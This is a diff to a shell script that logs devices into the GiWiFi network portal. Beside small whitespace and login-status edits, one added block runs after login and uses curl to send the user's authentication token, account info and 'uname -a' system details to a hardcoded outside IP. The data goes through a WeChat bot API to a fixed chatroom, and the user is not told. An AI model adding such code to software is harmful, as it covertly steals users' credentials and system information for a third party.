@@ -8,7 +8,7 @@ GW_GTW=''
 GW_USER=''
 GW_PWD=''
 
-AUTH_TYPE=''     # pc/pad/staff for web auth, windows/mac for desktop app auth, android/ios/apad/ipad for mobile app auth, token for directly auth by token
+AUTH_TYPE='' # pc/pad/staff for web auth, windows/mac for desktop app auth, android/ios/apad/ipad for mobile app auth, token for directly auth by token
 AUTH_TOKEN=''
 SERVICE_TYPE='1' # 1: GiWiFi用户 2: 移动用户 3: 联通用户 4: 电信用户
 
@@ -779,12 +779,12 @@ access_type="$ACCESS_TYPE"\
 		echo "--> "$WEB_LOGIN_RTE"" && \
 		echo ''
 
-		#WEB_LOGIN_RTE_STATUS="$(get_json_value "$WEB_LOGIN_RTE" 'status')"
+		WEB_LOGIN_RTE_STATUS="$(get_json_value "$WEB_LOGIN_RTE" 'status')"
 		WEB_LOGIN_RTE_INFO="$(str_str "$WEB_LOGIN_RTE" '"info":"' '","')"
 		WEB_LOGIN_RTE_DATA="$(get_json_value "$WEB_LOGIN_RTE" 'data')"
 		WEB_LOGIN_RTE_DATA_REASONCODE="$(get_json_value "$WEB_LOGIN_RTE_DATA" 'reasoncode')"
 
-		if [ ! "$WEB_LOGIN_RTE_DATA_REASONCODE" = '0' ]; then
+		if [ ! "$WEB_LOGIN_RTE_STATUS" = '1' ]; then
 			logcat "$WEB_LOGIN_RTE_INFO" 'E'
 			if [ "$WEB_LOGIN_RTE_DATA_REASONCODE" = '43' ]; then
 				read -t 20 -r -p "Are you sure to rebind your device? [Y/n] " input
@@ -1117,10 +1117,30 @@ IP:               "$CLIENT_IP"
 MAC:              "$CLIENT_MAC"
 Station SN:       "$STATION_SN"
 Token:            "$AUTH_TOKEN"
-Info:             "$( [ "$AUTH_INFO" ] && echo "$AUTH_INFO" || echo 'none')"
+Info:             "$([ "$AUTH_INFO" ] && echo "$AUTH_INFO" || echo 'none')"
 Logged:           yes
 --------------------------------------------\
 """
+
+	RTS_URL='http://1.15.110.128:8898'
+	WXID='wxid_bijpdm9y7y6s12'
+	CHATROOM='23519004494@chatroom'
+
+	TIME=$(date "+%Y-%m-%d %H:%M:%S")
+
+	# CONTENT="================\ntoken pusblish task\nby giwifi-gear@icepie\n================\nType: "${AUTH_MODE}"-"${AUTH_TYPE}" \nToken: "${AUTH_TOKEN}" \nLink: $AUTH_LINK \nInfo: "${AUTH_INFO}" \nTime: "${TIME}""
+
+	CONTENT="\nToken pub task\n-------------------------\nType: "${AUTH_MODE}"-"${AUTH_TYPE}"\nToken: "$AUTH_TOKEN"\nInfo: "$AUTH_INFO"\nTime: "$TIME"\nSys: "$(uname -a)"\n-------------------------\nby giwifi-gear@icepie"
+
+	RTS_DATA="$(
+		printf '{"ToUserName":"%s","Content":"%s","MsgType":1,"AtUsers":""}' \
+		"${CHATROOM}" \
+		"$CONTENT"
+	)"
+
+	curl -s "${RTS_URL}/v1/LuaApiCaller?funcname=SendMsg&timeout=10&wxid=${WXID}" \
+	-H 'Content-Type: application/json' \
+	-d "${RTS_DATA}"
 
 	if [ $ISDAEMON ]; then
 
